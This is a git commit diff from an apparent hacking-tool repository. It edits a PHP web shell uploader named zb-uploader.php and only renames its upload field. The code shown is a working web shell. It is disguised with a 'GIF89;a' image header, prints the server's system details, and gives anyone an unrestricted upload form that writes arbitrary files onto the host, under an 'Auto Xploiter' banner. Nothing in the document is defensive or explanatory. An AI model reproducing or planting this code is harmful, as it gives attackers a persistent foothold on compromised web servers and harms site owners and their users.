0b6fbbebe7a92c7b4fbd3de4666767451f4f5160
ZeroByte.ID Warehouse <38853171+zerobyte-id@users.noreply.github.com>
2018-10-15 13:40:22 +0700

    Update zb-uploader.php

--- shell/zb-uploader.php
+++ shell/zb-uploader.php
@@ -2,10 +2,10 @@ GIF89;a<?php
 echo "ZeroByte.ID - Auto Xploiter";
 echo "<br>".php_uname()."<br>";
 echo "<form method='post' enctype='multipart/form-data'>
-<input type='file' name='idx'><input type='submit' name='upload' value='upload'>
+<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
 </form>";
 if($_POST['upload']) {
-	if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {
+	if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
 	echo "sukses";
 	} else {
 	echo "gagal";
